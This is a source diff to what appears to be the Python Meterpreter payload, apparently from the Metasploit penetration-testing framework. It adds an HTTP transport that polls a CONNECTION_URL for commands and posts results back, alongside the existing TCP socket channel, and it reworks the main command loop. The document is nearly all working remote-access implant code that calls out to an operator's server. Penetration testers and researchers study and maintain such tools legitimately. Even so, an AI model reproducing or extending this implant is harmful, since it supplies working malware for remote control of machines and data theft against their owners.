@@ -19,7 +19,10 @@ else:
 	has_windll = hasattr(ctypes, 'windll')
 
 try:
-	import urllib
+	if sys.version_info[0] < 3:
+		urlopen = __import__('urllib', fromlist=['urlopen']).urlopen
+	else:
+		urlopen = __import__('urllib.request', fromlist=['urlopen']).urlopen
 except ImportError:
 	has_urllib = False
 else:
@@ -30,9 +33,11 @@ if sys.version_info[0] < 3:
 	bytes = lambda *args: str(*args[:1])
 	NULL_BYTE = '\x00'
 else:
+	is_str = lambda obj: issubclass(obj.__class__, __builtins__.str)
 	is_bytes = lambda obj: issubclass(obj.__class__, bytes)
-	str = lambda x: __builtins__['str'](x, 'UTF-8')
+	str = lambda x: __builtins__.str(x, 'UTF-8')
 	NULL_BYTE = bytes('\x00', 'UTF-8')
+	long = int
 
 #
 # Constants
@@ -294,13 +299,22 @@ export(STDProcess)
 class PythonMeterpreter(object):
 	def __init__(self, socket=None):
 		self.socket = socket
+		self.driver = None
+		self.running = False
+		self.communications_active = True
+		self.communications_last = 0
+		if self.socket:
+			self.driver = 'tcp'
+		elif CONNECTION_URL:
+			self.driver = 'http'
 		self.extension_functions = {}
 		self.channels = {}
 		self.interact_channels = []
 		self.processes = {}
 		for func in list(filter(lambda x: x.startswith('_core'), dir(self))):
 			self.extension_functions[func[1:]] = getattr(self, func)
-		self.running = True
+		if self.driver:
+			self.running = True
 
 	def register_function(self, func):
 		self.extension_functions[func.__name__] = func
@@ -327,25 +341,61 @@ class PythonMeterpreter(object):
 		return idx
 
 	def get_packet(self):
-		request = None
+		packet = getattr(self, 'get_packet_' + self.driver)()
+		self.communications_last = time.time()
+		if packet:
+			self.communications_active = True
+		return packet
+
+	def send_packet(self, packet):
+		getattr(self, 'send_packet_' + self.driver)(packet)
+		self.communications_last = time.time()
+		self.communications_active = True
+
+	def get_packet_http(self):
+		packet = None
+		try:
+			url_h = urlopen(CONNECTION_URL, bytes('RECV', 'UTF-8'))
+			packet = url_h.read()
+		except:
+			pass
+		if packet:
+			packet = packet[8:]
+		else:
+			packet = None
+		return packet
+
+	def send_packet_http(self, packet):
+		try:
+			url_h = urlopen(CONNECTION_URL, packet)
+			response = url_h.read()
+		except:
+			pass
+
+	def get_packet_tcp(self):
+		packet = None
 		if len(select.select([self.socket], [], [], 0.5)[0]):
-			request = self.socket.recv(8)
-			if len(request) != 8:
+			packet = self.socket.recv(8)
+			if len(packet) != 8:
 				self.running = False
 				return None
-			req_length, req_type = struct.unpack('>II', request)
-			req_length -= 8
-			request = bytes()
-			while len(request) < req_length:
-				request += self.socket.recv(4096)
-		return request
+			pkt_length, pkt_type = struct.unpack('>II', packet)
+			pkt_length -= 8
+			packet = bytes()
+			while len(packet) < pkt_length:
+				packet += self.socket.recv(4096)
+		return packet
 
-	def send_packet(self, response):
-		self.socket.send(response)
+	def send_packet_tcp(self, packet):
+		self.socket.send(packet)
 
 	def run(self):
 		while self.running:
-			request = self.get_packet()
+			request = None
+			should_get_packet = self.communications_active or ((time.time() - self.communications_last) > 0.5)
+			self.communications_active = False
+			if should_get_packet:
+				request = self.get_packet()
 			if request:
 				response = self.create_response(request)
 				self.send_packet(response)
@@ -565,7 +615,7 @@ if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
 		except OSError:
 			pass
 	if CONNECTION_URL and has_urllib:
-		met = PythonMeterpreter(s)
+		met = PythonMeterpreter()
 	else:
 		met = PythonMeterpreter(s)
 	met.run()
